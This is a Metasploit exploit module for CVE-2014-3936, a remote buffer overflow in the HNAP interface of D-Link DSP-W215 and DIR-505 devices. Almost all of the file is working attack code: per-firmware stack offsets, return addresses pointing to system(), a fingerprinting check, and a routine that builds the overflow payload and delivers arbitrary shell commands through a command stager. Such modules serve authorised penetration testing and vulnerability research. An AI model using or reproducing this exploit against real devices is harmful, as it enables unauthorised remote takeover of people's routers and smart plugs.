##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStagerEcho

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'D-Link HNAP Buffer Overflow in POST Request',
      'Description'    => %q{
          This module exploits an anonymous remote code execution vulnerability on different D-Link devices.
        This module has been successfully tested on D-Link DIR-505 in an emulated environment.
      },
      'Author'         =>
        [
          'Craig Heffner',   # vulnerability discovery and initial exploit
          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => ['linux'],
      'Arch'           => ARCH_MIPSBE,
      'References'     =>
        [
          [ 'CVE', '2014-3936' ],
          [ 'BID', '67651' ],
          [ 'URL', 'http://www.devttys0.com/2014/05/hacking-the-d-link-dsp-w215-smart-plug/' ], # blog post from Craig including PoC
          [ 'URL', 'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10029' ]
        ],
      'Targets'        =>
        [
          [ 'D-Link DSP-W215 - v1.0',
            {
              'Offset'      => 1000000,
              'JumpSystem'  => "\x00\x40\x5C\xAC",    # jump to system
            }
          ],
          [ 'D-Link DIR-505 - v1.06',
            {
              'Offset'      => 30000,
              'JumpSystem'  => "\x00\x40\x52\x34",    # jump to system
            }
          ],
          [ 'D-Link DIR-505 - v1.07',
            {
              'Offset'      => 30000,
              'JumpSystem'  => "\x00\x40\x5C\x5C",    # jump to system
            }
          ]
        ],
      'DisclosureDate' => 'May 15 2014',
      'DefaultTarget' => 0))
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => "/HNAP1/",
        'method'  => 'GET'
      })

      if res && [200, 301, 302].include?(res.code) && \
         (res.body =~ /DIR-505/ && (res.body =~ /1.07/ || res.body =~ /1.06/)) || \
         (res.body =~ /DSP-W215/ && (res.body =~ /1.00/))
        print_good("#{peer} - detected a vulnerable device")
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    print_status("#{peer} - Trying to access the vulnerable URL...")

    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::Unknown, "#{peer} - Failed to detect a vulnerable device")
    end

    print_status("#{peer} - Exploiting ...")
    execute_cmdstager(
      :linemax => 185
    )
  end

  def prepare_shellcode(cmd)
    buf = rand_text_alpha_upper(target['Offset'])   # Stack filler
    buf << rand_text_alpha_upper(4)                 # $s0, don't care
    buf << rand_text_alpha_upper(4)                 # $s1, don't care
    buf << rand_text_alpha_upper(4)                 # $s2, don't care
    buf << rand_text_alpha_upper(4)                 # $s3, don't care
    buf << rand_text_alpha_upper(4)                 # $s4, don't care
    buf << target['JumpSystem']                     # $ra
    buf << rand_text_alpha_upper(40)                # Stack filler
    buf << cmd                                      # Command to execute
    buf << "\x00"                                   # NULL-terminate the command
  end

  def execute_command(cmd, opts)
    shellcode = prepare_shellcode(cmd)

    begin
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => "/HNAP1/",
        'encode_params' => false,
        'data' => shellcode,
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end
